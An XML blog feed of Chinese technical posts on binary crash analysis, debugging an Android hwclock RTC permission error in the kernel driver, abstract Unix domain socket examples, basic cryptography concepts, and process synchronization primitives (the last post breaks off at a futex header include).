   76644:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   7664b:	48 8b 35 06 b2 40 00 	mov    0x40b206(%rip),%rsi        # 481858 &lt;_ZSt7nothrow@GLIBCXX_3.4>
   76652:	bf 00 10 00 00       	mov    $0x1000,%edi
   76657:	e8 b4 2d fe ff       	callq  59410 &lt;_ZnamRKSt9nothrow_t@plt>
   7665c:	48 8d 7c 24 28       	lea    0x28(%rsp),%rdi
   76661:	48 89 c5             	mov    %rax,%rbp
   76664:	48 8b 05 5d 1c 1a 00 	mov    0x1a1c5d(%rip),%rax        # 2182c8 &lt;_ZTSNSt6thread11_State_implINS_8_InvokerISt5tupleIJMN4yLib11yThreadPoolEFvvEPS4_EEEEEE@@Base+0x4e8>
   7666b:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   76670:	e8 fb 1c fe ff       	callq  58370 &lt;pipe@plt>
   76675:	85 c0                	test   %eax,%eax
   76677:	0f 88 69 03 00 00    	js     769e6 &lt;_ZN4yLib6yShell16yLibGetClassInfoEv@@Base+0x506>
   7667d:	e8 4e e5 fd ff       	callq  54bd0 &lt;fork@plt>
   76682:	41 89 c4             	mov    %eax,%r12d
   76685:	85 c0                	test   %eax,%eax
   76687:	0f 88 08 07 00 00    	js     76d95 &lt;_ZN4yLib6yShell16yLibGetClassInfoEv@@Base+0x8b5>
   7668d:	0f 84 1d 01 00 00    	je     767b0 &lt;_ZN4yLib6yShell16yLibGetClassInfoEv@@Base+0x2d0>
   76693:	8b 7c 24 2c          	mov    0x2c(%rsp),%edi
   76697:	e8 24 3e fe ff       	callq  5a4c0 &lt;close@plt>
   7669c:	48 8d 74 24 1c       	lea    0x1c(%rsp),%rsi
   766a1:	31 d2                	xor    %edx,%edx
   766a3:	44 89 e7             	mov    %r12d,%edi
   766a6:	e8 55 00 fe ff       	callq  56700 &lt;waitpid@plt>
   766ab:	8b 44 24 1c          	mov    0x1c(%rsp),%eax
   766af:	a8 7f                	test   $0x7f,%al
   766b1:	0f 85 8a 07 00 00    	jne    76e41 &lt;_ZN4yLib6yShell16yLibGetClassInfoEv@@Base+0x961>
   766b7:	0f b6 cc             	movzbl %ah,%ecx
   766ba:	f6 c4 ff             	test   $0xff,%ah
   766bd:	0f 85 cd 03 00 00    	jne    76a90 &lt;_ZN4yLib6yShell16yLibGetClassInfoEv@@Base+0x5b0>
   766c3:	8b 7c 24 28          	mov    0x28(%rsp),%edi
   766c7:	48 8d 35 52 cb 1c 00 	lea    0x1ccb52(%rip),%rsi        # 243220 &lt;_ZTSN4Json12RuntimeErrorE@@Base+0x60>
   766ce:	e8 cd 0d fe ff       	callq  574a0 &lt;fdopen@plt>
   766d3:	49 89 c4             	mov    %rax,%r12
   766d6:	48 85 ed             	test   %rbp,%rbp
   766d9:	0f 84 f1 02 00 00    	je     769d0 &lt;_ZN4yLib6yShell16yLibGetClassInfoEv@@Base+0x4f0>
   766df:	4c 8d 74 24 70       	lea    0x70(%rsp),%r14
   766e4:	0f 1f 40 00          	nopl   0x0(%rax)
   766e8:	31 f6                	xor    %esi,%esi
   766ea:	ba 01 10 00 00       	mov    $0x1001,%edx
   766ef:	48 89 ef             	mov    %rbp,%rdi
   766f2:	b9 00 10 00 00       	mov    $0x1000,%ecx
   766f7:	e8 44 1e fe ff       	callq  58540 &lt;__memset_chk@plt>
   766fc:	4c 89 e2             	mov    %r12,%rdx

  我们往此偏移往上查找，找到了764f0偏移的特殊指令，这里一看就是一个函数的开始位置（这里为啥是函数开始，主要是操作备份rbp，申请栈，操作rsp等等）。
  这里其实又有两个选择，我们在分析函数头的过程中，其实已经找到了足够多的我们想要找的函数特征：例如这里调用了fork/pipe/fdopen等等，如果情况是这样的，那么其实我们可以综合分析，找到我们源码对应出错的位置了。
  那如果我们的函数平平无奇，没有什么明显特征怎么搞呢？还是只有利用我们的函数头来判断，到底是我们写的哪个函数出问题了。
  于是我们拿着764f0偏移，通过readelf -s来查找符号，发现不是任何一个我们已知的符号，这尼玛就坑了啊。到了这里，其实现在不好搞啊。我们用gdb record / ida / objdump + grep 来综合分析，发现了跳转到当前地址的一个地方。下面是用readelf+objdump+grep来得到的一段片段：
764f0:	41 57                	push   %r15
77090:	e9 5b f4 ff ff       	jmpq   764f0 &lt;_ZN4yLib6yShell16yLibGetClassInfoEv@@Base+0x10>
  我们再次用objdump和readelf查找77090这个偏移，终于在符号表查到了我们关心的这个偏移，如下：
559: 0000000000077090     5 FUNC    GLOBAL DEFAULT   12 _ZN4yLib6yShell7ExecuteERKSt6vectorINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS7_EESB_SB_RS9_
  到此，通过复原cxx函数名字，我们就知道了我们在哪个函数里面崩溃的，而且是在这个函数的memset的地方导致溢出崩溃的。




后记

  此问题的分析加深了我们对计算机的理解，使用了较多的二进制分析工具。
  结合我以前的调试和反调试经验，新手我还是建议直接上刑具ida进行分析，这样更棒哦。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
        <category>linux</category>
        <category>常识</category>
      </categories>
      <tags>
        <tag>overflow</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次有趣的hwclock写RTC的PermissionDenied错误</title>
    <url>/2023/11/19/blog_idx_125/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  稍微接触过嵌入式板卡的，基本都知道嵌入式板卡里面有个功能叫做RTC。在Linux里面，有几个概念比较重要，它们分别是系统时间和硬件时钟。对于系统时间的话，大家都了解的比较多，我们在各种界面上看到的时间都是系统时间，我们在CLI里面，用date命令操作的时间就是系统时间，我们的系统时间可以通过网络同步或者说RTC同步。
  此外，还有一个硬件时钟功能，这个功能就是RealTimeClock，它主要是用纽扣电池来维护一个硬件时钟，主要是用来同步时钟用的。例如，我们的设备怎么在没有网络的情况下，每次上电开机都能够得到真实时间，就需要靠RTC功能。对于RTC来说，在Linux里面，我们一般使用hwclock命令来对他做相关的操作，例如设置硬件时钟，例如从硬件时钟中得到真实时间，并设置到系统时钟等等。
一个奇怪的错误

  上面我们提到了hwclock，最近，我们常用的一个板卡，其是Android系统，我们在交付给客户的时候，发现了一个奇怪的问题，我们执行hwclock失败了，而且错误还是Permission Deniend，熟悉linux的朋友可能都经常看到这个错误，它就是权限错误。下面是我们执行此命令的环境和错误：

    
        
    
    
  有人立马就会想到是不是我们没有用root用户来执行的原因，从上图可知，并不是这样的，这个错误远远没有想象的那么简单，但是也没有那么复杂。




深入分析相关源码

  首先，在Android里面，hwclock是来至于一个叫做toybox的库，大概在external/toybox/toys/other/hwclock.c，其中关于设置硬件时钟时的核心代码段如下：
if (toys.optflags &amp; FLAG_w) &#123;
    /* The value of tm_isdst is positive if daylight saving time is in effect,
     * zero if it is not and negative if the information is not available.
     * todo: so why isn't this negative...? */
    tm.tm_isdst = 0;
    xioctl(fd, RTC_SET_TIME, &amp;tm);
&#125;
  看到这里，我们明白，必须要到内核源码才能够得到我们想要的答案。
  通过RTC_SET_TIME，在内核代码的drivers/rtc/rtc-dev.c里面，我们找到了第一处可能导致出现Permission Deniend的地方，代码如下：
static long rtc_dev_ioctl(struct file *file,
                unsigned int cmd, unsigned long arg)
&#123;
    int err = 0;
    struct rtc_device *rtc = file->private_data;
    const struct rtc_class_ops *ops = rtc->ops;
    struct rtc_time tm;
    struct rtc_wkalrm alarm;
    void __user *uarg = (void __user *) arg;

    err = mutex_lock_interruptible(&amp;rtc->ops_lock);
    if (err)
            return err;

    /* check that the calling task has appropriate permissions
        * for certain ioctls. doing this check here is useful
        * to avoid duplicate code in each driver.
        */
    switch (cmd) &#123;
    case RTC_EPOCH_SET:
    case RTC_SET_TIME:
            if (!capable(CAP_SYS_TIME))
                    err = -EACCES;
            break;

    case RTC_IRQP_SET:
            if (arg > rtc->max_user_freq &amp;&amp; !capable(CAP_SYS_RESOURCE))
                    err = -EACCES;
            break;

    case RTC_PIE_ON:
            if (rtc->irq_freq > rtc->max_user_freq &amp;&amp;
                            !capable(CAP_SYS_RESOURCE))
                    err = -EACCES;
            break;
    &#125;

        //......
&#125;
  这里产生权限拒绝的原因是由于Linux Capability，因此我们首要的是检查我们的hwclock有没有CAP_SYS_TIME能力，我们通过prctl + PR_CAPBSET_READ 来获取hwclock有没有这个能力（当然，这里可以有很多的其他方式来确定，我这里用最简单的方法来确定），在hwclock源码中添加如下代码段：
int ret = prctl(PR_CAPBSET_READ, CAP_SYS_TIME);
if (ret &lt; 0)
        perror("sky: prctl PR_CAPBSET_READ");

printf("has CAP_SYS_TIME %d\n", ret);

  运行结果如下图：

    
        
    
   
  从这里我们可以知道，我们的hwclock程序是具备CAP_SYS_TIME的，因此，报权限拒绝的地方并不在这里。
  我们接着通过RTC_SET_TIME，在内核代码的drivers/rtc/rtc-dev.c里面，有如下片段：
static long rtc_dev_ioctl(struct file *file,
                unsigned int cmd, unsigned long arg)
&#123;
    // ... ...
    case RTC_SET_TIME:
            mutex_unlock(&amp;rtc->ops_lock);

            if (copy_from_user(&amp;tm, uarg, sizeof(tm)))
                    return -EFAULT;

            return rtc_set_time(rtc, &amp;tm);
    
    // ... ...
&#125;
  我们从这里可以看到，通过RTC_SET_TIME，我们执行rtc_set_time此方法，然后得到了返回值，我们有理由怀疑，我们得到的权限拒绝，来自于这个地方。
  在内核代码的drivers/rtc/interface.c里面，有rtc_set_time的定义，函数定义如下：
int rtc_set_time(struct rtc_device *rtc, struct rtc_time *tm)
&#123;
        int err;

        err = rtc_valid_tm(tm);
        if (err != 0)
                return err;

        err = rtc_valid_range(rtc, tm);
        if (err)
                return err;

        rtc_subtract_offset(rtc, tm);

        err = mutex_lock_interruptible(&amp;rtc->ops_lock);
        if (err)
                return err;

        if (!rtc->ops)
                err = -ENODEV;
        else if (rtc->ops->set_time)
                err = rtc->ops->set_time(rtc->dev.parent, tm);
        else if (rtc->ops->set_mmss64) &#123;
                time64_t secs64 = rtc_tm_to_time64(tm);

                err = rtc->ops->set_mmss64(rtc->dev.parent, secs64);
        &#125; else if (rtc->ops->set_mmss) &#123;
                time64_t secs64 = rtc_tm_to_time64(tm);
                err = rtc->ops->set_mmss(rtc->dev.parent, secs64);
        &#125; else
                err = -EINVAL;

        pm_stay_awake(rtc->dev.parent);
        mutex_unlock(&amp;rtc->ops_lock);
        /* A timer might have just expired */
        schedule_work(&amp;rtc->irqwork);

        trace_rtc_set_time(rtc_tm_to_time64(tm), err);
        return err;
&#125;
EXPORT_SYMBOL_GPL(rtc_set_time);

  从这段代码可知，真正的错误还是来自于rtc 具体驱动里面的xxx_set_time 函数里面。在Linux内核里面，有许多的RTC驱动，因此，我们需要了解到我们的当前的RTC硬件是什么，我们通过logcat -b kernel |grep rtc命令得到了如下的信息：

    
        
    
   
  因此，我们当前的rtc驱动就是rtc-pm8xxx，我们去查找相关的驱动源码drivers/rtc/rtc-pm8xxx.c，发现了一点端倪，其set_time源码重点片段如下：
static int pm8xxx_rtc_set_time(struct device *dev, struct rtc_time *tm)
&#123;
    // ... ...
    struct pm8xxx_rtc *rtc_dd = dev_get_drvdata(dev);
    // ... ...
    
    // ... ...
    if (!rtc_dd->allow_set_time)
            return -EACCES;
    // ... ...
&#125;
  从这里，我们可以知道，这个驱动有一个allow_set_time的参数，如果不允许，就会返回权限拒绝，那到底可不可以呢？我们尝试将这个属性设置一下，或者直接修改当前的源码。我们全局查找一下这个属性，发现其来自于这里：
static int pm8xxx_rtc_probe(struct platform_device *pdev)
&#123;
    // ... ...
    struct pm8xxx_rtc *rtc_dd;

    // ... ...
    rtc_dd = devm_kzalloc(&amp;pdev->dev, sizeof(*rtc_dd), GFP_KERNEL);
    if (rtc_dd == NULL)
            return -ENOMEM;
    // ... ...
    rtc_dd->allow_set_time = of_property_read_bool(pdev->dev.of_node,
                                                "allow-set-time");
    // ... ...
&#125;
  从这里，我们可以知道当前这个rtc_dd-&gt;allow_set_time来自于dts里面，一个叫做allow-set-time的属性。
  我们通过pm8150_rtc全局搜索，在某dtsi文件里面发现了此驱动的相关定义，我们修改这个字段，添加allow-set-time属性，示例如下：

pm8150_rtc: qcom,pm8150_rtc &#123;
        &#x2F;&#x2F; ... ...
        allow-set-time;
&#125;;

  然后我们通过重新编译android源码，重新生成dtbo.img镜像，然后刷入我们的系统，然后我们惊奇的发现，我们解决了这个奇怪的permission denied问题。




后记

  虽然，我们解决了permission denied问题，但是后续还是出现了rtc无法正常设置的问题，通过内核日志查看，是pm8150驱动出了问题，最后只能交给上游板卡厂家去适配解决。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>hwclock</tag>
      </tags>
  </entry>
  <entry>
    <title>初识uds之abstract socket</title>
    <url>/2023/11/19/blog_idx_126/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  在《记一次有趣的hwclock写RTC的PermissionDenied错误》（https://www.cnblogs.com/Iflyinsky/p/17841708.html 或者 https://https😕/flyinskyin2013.github.io/2023/11/19/blog_idx_125/）中，我们提到了关于高通板卡，我们无法通过hwclock来写入rtc时钟。但是我们通过相关调查、测试、分析后发现，高通自己搞了一套新的方式来写入rtc时钟，这种特殊方法用的技术就是abstract socket。这也是我在工作中第一次遇到abstract socket，这里做一个简要的记录。
Abstract sockets

  
说明
  我们先不看代码，我们先看看abstract sockets具体是什么样子的。我们都知道，我们可以通过netstat查看unix socket相关的连接信息。我们来看看ubuntu 18.04里面用netstat查看unix socket信息如下：

    
        
    
   
  注意图中我们看到的path那一列，除了普通的路径外，我们会看到一些奇怪的名字，每个名字前面都有一个@符号。这种特殊的名字，就是abstract sockets。


简介
  首先，根据文档，对于传统的uds来说，其支持两种类型，它们分别是：有名字的、未命名的。对于linux来说，这里还支持一种独立于文件系统的，且是一种不可移植的扩展，这就是我们要介绍的就是抽象的这种类型。
  对于抽象的uds来说，socket权限对其来说是没有意义的，例如umask、fchown、fchmod等不会影响其访问权限。
  对于抽象的uds来说，抽象的uds将会自动被销毁，当所有的引用打开的socket关闭的时候。
  对于抽象的uds来说，和有名字的uds最大的区别在于sockaddr_un.sun_path[0]是0x00，如果大家对c风格的字符串有印象，这是一个字符串的终止符。abstract uds的名字由sockaddr_un.sun_path的其余字节给出（这个时候的0x00是没有特殊意义的），其长度是addrlen - sizeof(sa_family_t)来定义的。


使用小例子
server
#include &lt;sys/socket.h>
#include &lt;sys/un.h>
#include &lt;unistd.h>
#include &lt;errno.h>
#include &lt;string.h>
#include &lt;stdio.h>

int main(int argc, char * argv[])
&#123;
	int uds = socket(AF_UNIX, SOCK_STREAM, 0);
	if (uds &lt; 0) perror("socket:");

	struct sockaddr_un addr;
	addr.sun_family = AF_UNIX;
	memset(addr.sun_path, 0x0, 108);
	const char * addr_path = "abstract_test";
	memcpy(addr.sun_path + 1, addr_path, strlen(addr_path));

	int ret = bind(uds, &amp;addr, strlen(addr_path) + sizeof(sa_family_t) + 1);
	if (ret &lt; 0) perror("bind:");

	ret = listen(uds, 2);
	if (ret &lt; 0) perror("listen:");
	
	struct sockaddr_un r_addr;
	socklen_t r_addr_len;
	int _new = accept(uds, &amp;r_addr, &amp;r_addr_len);
	if (_new &lt; 0) perror("accept:");
	char r_msg[256];
	memset(r_msg, 0x0, 256);
	ret = read(_new, r_msg, 256);
	if (ret &lt; 0) perror("read:");
	printf("client msg = %s\n", r_msg);	
	write(_new, "hello client", sizeof("hello client"));

	sleep(5);

	close(uds);
	return 0;
&#125;
client.c
#include &lt;sys/socket.h>
#include &lt;sys/un.h>
#include &lt;unistd.h>
#include &lt;errno.h>
#include &lt;string.h>
#include &lt;stdio.h>

int main(int argc, char * argv[])
&#123;
	int uds = socket(AF_UNIX, SOCK_STREAM, 0);
	if (uds &lt; 0) perror("socket:");

	struct sockaddr_un addr;
	addr.sun_family = AF_UNIX;
	memset(addr.sun_path, 0x0, 108);
	const char* addr_path = "abstract_test";
	memcpy(addr.sun_path + 1, addr_path, strlen(addr_path));


	int ret = connect(uds, &amp;addr, strlen(addr_path) + sizeof(sa_family_t) + 1);
	if (ret &lt; 0) perror("connect:");

	write(uds, "hello server", sizeof("hello server"));
	
	char r_msg[256];
	memset(r_msg, 0x0, 256);
	read(uds, r_msg, 256);
	printf("server msg %s\n", r_msg);	

	sleep(5);
	close(uds);
	return 0;
&#125;
  首先我们撸了两个例子，一个是服务端，一个是客户端。
  首先我们运行客户端。然后通过netstat查看我们的socket。如下图：

    
        
    
   
  当我们运行服务端后，再次运行客户端，就会看到我们传输的消息，如下图：

    
        
    
   




后记

  通过我们如上的实验，可以看到其和普通的uds用法差不多，唯一的区别就是其不需要和文件系统绑定了。
  其实，这种不和文件系统绑定的特性，可以给我们带来更多有趣的用法（例如：不受文件系统权限影响进行通信），后续有缘分享。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
        <category>android</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>uds</tag>
        <tag>abstract socket</tag>
      </tags>
  </entry>
  <entry>
    <title>常用加密及其相关的概念、简介（对称、AES、非对称、RSA、散列、HASH、消息认证码、HMAC、签名、CA、数字证书、base64、填充）</title>
    <url>/2024/03/16/blog_idx_127/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  在之前，一直是通过生活、工作零零碎碎接触过加密及加密算法相关的信息，但是也只是听说过，并不知道这些算法用处和区别。
  最近由于工作安排，需要将Fernet算法实现一版C++的加解密定制程序，由于Fernet组合了许多的基础加密算法，因此在这个地方，对一些常用的基础加密算法做一个总结。




加密是什么？

  介绍：把“原始数据”通过某种算法+秘钥变换后，得到了“加密数据”的这个过程叫做加密。从这里也可以看到，对于加密来说，其核心要素就是：加密算法+秘钥。
  意义：对于“加密数据”来说，未授权的用户，不能够直接知道“原始数据”的内容。
  下面介绍一些常见的加密类别和加密相关配套的其他内容。




对称加密

  对称加密是指使用 一个相同秘钥 就能对消息进行加密和解密的加密方法。
  对称加密的特点就是使用 一个相同秘钥。
  我们常见的对称加密有：XOR、AES等。下面我们来简单分析一下AES加密。


AES加密
  高级加密标准（Advanced Encryption Standard，AES），是一种区块加密标准。从它的定义来看，其特点是区块加密，一般来说，我们常见的有AES128和AES256。
  例如我们可以用如下的openssl提供的方法进行AES的加解密：
int AES_set_encrypt_key(const unsigned char *userKey, const int bits,
                        AES_KEY *key);
int AES_set_decrypt_key(const unsigned char *userKey, const int bits,
                        AES_KEY *key);

//注意这里只是一种cbc加密方法，aes还有很多其他加密方法
void AES_cbc_encrypt(const unsigned char *in, unsigned char *out,
                     size_t length, const AES_KEY *key,
  其实我们从上面的描述来看，就知道AES一般以16字节或者32字节为一组（我们将其定义为区块大小），进行加密。这里就会引申出一个问题，如果我们的数据（最后一组消息）不够一个区块大小，我们应该怎么办？这里提供的常见方案就是做填充。




非对称加密（公钥加密算法）

  我们知道，加密一般是用于消息传递，那么如果是对称加密的情况下，要传递的两个事务：加密消息+秘钥。对于对称加密来说，如果我们的秘钥泄露了，就基本上等于明文传递了。因此，有了非对称加密。其实后面很多的加密方法就在平衡 加密消息+秘钥 两个事情。
  非对称加密就是有两个秘钥（私钥，公钥），实现1对多的双向通信。其中我们常见的加密方式是：RSA，ECC等。下面，我们尝试简单介绍RSA。


RSA 加密算法
  简介（来自于Wikipedia）：RSA加密算法是一种非对称加密算法。RSA是由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）在1977年一起提出的。当时他们三人都在麻省理工学院工作。RSA 就是他们三人姓氏开头字母拼在一起组成的。
  RSA只从使用的角度来说，只需要了解如下的大致的概念：


模数N、公钥指数pubE、私钥指数priE


加密：秘文=明文^priE mod N，秘文=明文^pubE mod N


解密：明文=秘文^pubE mod N，明文=秘文^priE mod N


  从上面来看，私钥= 私钥指数priE + 模数N，公钥= 公钥指数pubE + 模数N。至于公钥，私钥，模数怎么来的，网上已有许多资料，有兴趣可以去看看。
  基于openssl的RSA代码节选：
// 生成秘钥，秘钥里面包含了私钥+公钥
int RSA_generate_key_ex(RSA *rsa, int bits, BIGNUM *e, BN_GENCB *cb);

// 基于公钥和私钥的加解密
int RSA_public_encrypt(int flen, const unsigned char *from,
                       unsigned char *to, RSA *rsa, int padding);
int RSA_private_encrypt(int flen, const unsigned char *from,
                        unsigned char *to, RSA *rsa, int padding);
int RSA_public_decrypt(int flen, const unsigned char *from,
                       unsigned char *to, RSA *rsa, int padding);
int RSA_private_decrypt(int flen, const unsigned char *from,
                        unsigned char *to, RSA *rsa, int padding);




散列函数（Hash function）

  介绍：使用 散列函数（md5, sha1, sha256） 对原始数据进行处理，生成散列值（数字摘要）。这些散列函数保证一个输入对应一个输出，并且通过散列值无法得到原始数据输入，因此不属于加密。
  此外，如果散列函数不够健壮，可能会出现碰撞的可能性。
  意义：由于其不同的数据输入会得到不同的散列值，因此主要用来校验数据的完整性。
  基于openssl的常见散列函数代码节选：
//注意，根据官网的描述，如下这些接口已经逐步被弃用，这里只是起示例作用。
int SHA1_Init(SHA_CTX *c);
int SHA1_Update(SHA_CTX *c, const void *data, size_t len);
int SHA1_Final(unsigned char *md, SHA_CTX *c);

//注意，根据官网的描述，如下这些接口已经逐步被弃用，这里只是起示例作用。
int SHA256_Init(SHA256_CTX *c);
int SHA256_Update(SHA256_CTX *c, const void *data, size_t len);
int SHA256_Final(unsigned char *md, SHA256_CTX *c);
  其实做过编程的人，对hash这个概念并不陌生。




消息认证码

  含义：使用 散列函数+秘钥来生成认证码（MAC）。相较于散列函数来说，对于同一个消息，需要指定的秘钥+散列函数才能够得到最终的认证码。
  意义：在散列函数中，原始数据和散列值是绑定的。在一个消息传递系统中，散列函数只解决了数据完整性的问题，并没有解决数据来源是否可靠的问题（可以伪造原始数据+新散列值）。 通过消息验证码，由于有了秘钥的保护， 解决了 散列值+消息 来源不可靠的问题。
  基于openssl的消息认证码代码节选：
//这里的evp_md用来描述不同的散列函数
unsigned char *HMAC(const EVP_MD *evp_md, const void *key,
                     int key_len, const unsigned char *d, size_t n,
                     unsigned char *md, unsigned int *md_len);




签名算法

  下面是签名的一个简单流程：


基于公钥加密系统，生成秘钥对（公钥、私钥）。


对消息进行数字摘要计算。


对数字摘要进行私钥加密，得到数字签名。


将信息、数字签名、公钥发给接收者，接收者可以验证：信息的完整性+发送者的身份。


  从这里来看，我们可以知道，签名其实和消息认证码具有相同的意义，都能够验证：完整性+发送者的身份。但是由于其原理，导致其应用场景不一致。例如：数字签名由于使用非对称加密，而消息认证码可以认为是使用了对称加密，导致他们的使用场景是不一样的。




CA机构与数字证书

  其实从名字上来看，就知道CA机构与数字证书和签名算法相关，为了解决公钥加密系统中，公钥是否可信的问题。下面是它们的一些概念：


CA（Certificate Authority）是“证书颁发机构”的简称，它是“受信任”的第三方组织，负责验证申请者身份并发放数字证书。


数字证书是：特定用户或系统身份信息（如域名、组织名等）+ 该用户公钥 + 由权威机构（CA）签署的数字签名（对用户的信息+公钥） 组成的数据结构。


  简单来说，由于我们信任了CA的证书（CA的公钥），我们可以用CA的公钥解密出 数字证书用户的公钥，然后我们用 数字证书用户的公钥 和 数字证书用户加密通信。总的来说，数字证书其实是一个信任链的问题。




Base64 编码

  介绍：一种将 二进制数据 编码为 可见字符 的编码方法。简单来说就是用 4个字节的可见字符 代替是 3个字节数据 的编码过程。
  意义：可以将二进制数据表达为文本信息，方便后续对二进制数据进行处理。




数据区块填充，PKCS（Public-Key Cryptography Standards）

  特别说明，PKCS是一系列公钥密码标准，里面具备很多的内容，其大概有15个标准，分别是pkcs1,pkcs2 … … pkcs14,pkcs15
  从上面我们知道，现在常用的填充方法是：公钥加密标准（PKCS，Public-Key Cryptography Standards）里面的节选内容。其有很多填充类别，例如：PKCS1-padding节选, PKCS5-padding节选, PKCS7-padding节选，我们这里只讨论pkcs5和pkcs7。（注意，这些标准除了数据填充，还有其他定义内容。）
  下面先介绍PKCS5-padding，先定义数据区块大小为SIZE，pkcs5和pkcs7的填充说明，下面以SIZE=8字节举例：


要填充7个字节,那么填入的值就是0×07;


如果只填充１个字节，那么填入的值就是0×01;


数据恰好是8的倍数时还要补8个字节的0×08。


  从上面的PKCS5-padding，我们可以知道，这里需要数据区块固定为8字节。如果我们想给其他大小的数据区块做数据对齐，那么PKCS5-padding就不满足要求，因此就有PKCS7-padding的填充方法：


PKCS7-padding的数据区块大小可以是：1-255字节。


其他的，PKCS7-padding填充原理和PKCS5一样。


  从上面可知，PKCS7-padding节选包含了PKCS5-padding节选，且适用性范围更加的广泛。
  到了这里，我们就能够对AES128或者AES256做基于PKCS7-padding的16字节对齐或者32字节对齐的操作了。
  这里的代码实现很简单，这里提供一种方法，大概就是：首先对消息进行强制扩大255字节，然后根据数据区块大小做填充即可，基本可以实现pkcs7填充的原理。




后记

  其实，我们从上面的内容来看，能发现一些规律：


由于信任链的存在，因此有了CA机构和数字证书，而数字证书与签名算法相关，而签名算法又与 非对称加密和散列函数强相关。


然后为了实现我们现在常见的加密系统，我们使用了：对称加密、非对称加密、散列函数、消息认证码和base64编码等手段。


参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>常识</category>
        <category>C&amp;CPP</category>
      </categories>
      <tags>
        <tag>加密</tag>
      </tags>
  </entry>
  <entry>
    <title>关于进程同步与互斥的一些概念（锁、cas、futex）</title>
    <url>/2024/03/17/blog_idx_128/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  最近为了实现在android linux kernel上，是的bionic c和glibc的sem_相关的信号量接口能够相互调用的功能（例如：用bionic c wait，用glibc awake），需要去深度阅读相关c库关于sem_ posix api的实现。
  最终的最终，发现主要要解决futex的问题就行。因此将其相关的概念进行了总结。




进程同步与互斥的一些基本概念

  进程：


是操作系统调度的基本单位。


  进程状态：


三态模型：运行、就绪、等待（阻塞/睡眠）


五态模型：运行、就绪、等待（阻塞/睡眠） + 新建、终止


  进程调度：


因某些原因（io等待，自己睡眠，调度公平等等），一个或者多个进程需要进行状态切换。


  进程工作特性分类：


计算密集型：进程的主要工作是计算某些事情。


IO密集型：进程的主要工作是加载IO并进行处理。


  并发：


是指多个进程同时运行，并完成一定任务。


  临界区：


是指多个进程同时运行时，同一时刻访问相同的代码和数据。


  同步：


强调的是进程间的执行需要按照某种先后顺序，即进程运行的时间是有序的。


  互斥：


强调的是对于某些共享资源的访问不能同时进行，同一时间只能有一定数量的进程访问这些共享资源。


  进程常见的同步机制：


信号量：解决了同步问题。


互斥量：解决了互斥问题。是信号量的一种特例，只具备0，1两种值。






锁

  锁：


既可以解决同步问题，也可以解决互斥问题。


  死锁：


指多个进程同时获取锁，且由于某些原因，此锁永远不会被空闲。


  两种基本锁：


互斥锁：加锁失败后，线程会释放 CPU ，给其他线程；


自旋锁：加锁失败后，线程会忙等待，直到它拿到锁；


  读写锁：


读锁：当「写锁」没有被线程持有时，多个线程能够并发地持有读锁，这大大提高了共享资源的访问效率，因为「读锁」是用于读取共享资源的场景，所以多个线程同时持有读锁也不会破坏共享资源的数据。


写锁：一旦「写锁」被线程持有后，读线程的获取读锁的操作会被阻塞，而且其他写线程的获取写锁的操作也会被阻塞


特征：读写锁在读多写少的场景，能发挥出优势。读写锁可以分为「读优先锁」和「写优先锁」


  乐观锁：


如果多线程同时修改共享资源的概率比较低


  悲观锁：


认为多线程同时修改共享资源的概率比较高，于是很容易出现冲突，所以访问共享资源前，先要上锁。






CAS(Compare And Swap)

  CAS是一种无锁同步算法，主要用于多线程环境下面，高效的对多个线程进行同步。
  首先CAS有3个重要的参数：目标地址(P)、期望值(E)、新值(N)，然后其工作原理是：


读取目标地址（P）的值


对比目标地址（P）的值与期望值（E）


如果P==E，则写入新值（N），如果P!=E，则不做任何操作并返回。


  可以乍一看，这里有3步操作，会让我们对这个算法难以理解，所以这里还有一个重要的概念：CAS的这几步操作是原子的，一次性完成的，此外，这些特性是硬件提供的。因此，在实际使用上面，这些原子操作被编译器封装成相关的接口来使用这些硬件特性。例如gcc里面：
// https://gcc.gnu.org/onlinedocs/gcc/_005f_005fatomic-Builtins.html
// 注意，原来的__sync_*系列函数的__atomic系列替代了
bool __atomic_compare_exchange (type *ptr, type *expected, type *desired, bool weak, int success_memorder, int failure_memorder)




futex 系统调用

  futex是linux下用来实现各种同步机制的一个系统调用，我们先来学习看看其api：
#include &lt;linux/futex.h>
#include &lt;sys/time.h>

